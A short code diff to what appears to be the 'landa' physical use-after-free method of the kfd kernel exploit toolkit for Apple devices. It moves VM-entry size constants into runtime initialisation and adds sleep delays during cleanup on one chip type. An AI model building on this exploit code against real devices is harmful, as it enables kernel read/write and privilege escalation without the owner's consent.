@@ -4,15 +4,18 @@
 
 #include "landa.h"
 
-const uint64_t landa_vme1_size = pages(1);
-const uint64_t landa_vme2_size = pages(1);
-const uint64_t landa_vme4_size = pages(1);
+uint64_t landa_vme1_size;
+uint64_t landa_vme2_size;
+uint64_t landa_vme4_size;
 
 // Forward declarations for helper functions.
 void* landa_helper_spinner_pthread(void* arg);
 
 void landa_init(struct kfd* kfd)
 {
+    landa_vme1_size = pages(1);
+    landa_vme2_size = pages(1);
+    landa_vme4_size = pages(1);
     kfd->puaf.puaf_method_data_size = sizeof(struct landa_data);
     kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);
 }
@@ -135,10 +138,16 @@ void landa_cleanup(struct kfd* kfd)
     vm_address_t address1 = landa->copy_dst_address;
     vm_size_t size1 = min_puaf_page_uaddr - landa->copy_dst_address;
     assert_mach(vm_deallocate(mach_task_self(), address1, size1));
+    
+    if(ischip() == 7)
+        usleep(100000);
 
     vm_address_t address2 = max_puaf_page_uaddr + pages(1);
     vm_size_t size2 = (landa->copy_dst_address + landa->copy_size) - address2;
     assert_mach(vm_deallocate(mach_task_self(), address2, size2));
+    
+    if(ischip() == 7)
+        usleep(100000);
 
     /*
      * No middle block if the kread and kwrite pages are the same or back-to-back.
